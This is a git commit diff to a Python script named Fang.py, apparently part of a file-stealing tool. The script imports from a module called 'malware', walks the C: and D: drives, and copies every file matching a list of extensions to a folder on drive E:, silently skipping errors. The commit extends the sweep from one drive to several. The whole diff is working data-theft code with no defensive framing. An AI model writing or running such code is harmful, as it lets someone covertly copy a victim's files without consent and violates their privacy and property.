5aa1a64d512c8a7f0e1982ceb6ccd255c1547ca0
C4piti44 <97689075+C4piti44@users.noreply.github.com>
2022-01-29 21:06:02 +0200

    Update Fang.py
    1

--- Fang.py
+++ Fang.py
@@ -1,17 +1,19 @@
 import shutil
-from malware import*
+from malware import *
 import os
-for dirpath , dirname , filenames in os.walk(r'C:\\'):
-        for file in filenames:
-            if any(file.endswith(extension) for extension in ex_list):
-                try:
-                    shutil.copy(os.path.join(dirpath, file), r'E:\the_meat')
-                except PermissionError :
-                    pass
-                except FileNotFoundError:
-                    pass
+from itertools import chain
 
-
+# can change depend if it Mac ,Windows or Linux
+drivers = (r'D:\\', r'C:\\')
+for dirpath, dirname, filenames in chain.from_iterable(os.walk(driver) for driver in drivers):
+    for file in filenames:
+        if any(file.endswith(extension) for extension in ex_list):
+            try:
+                shutil.copy(os.path.join(dirpath, file), r'E:\the_meat')
+            except PermissionError:
+                pass
+            except FileNotFoundError:
+                pass
 
 
 
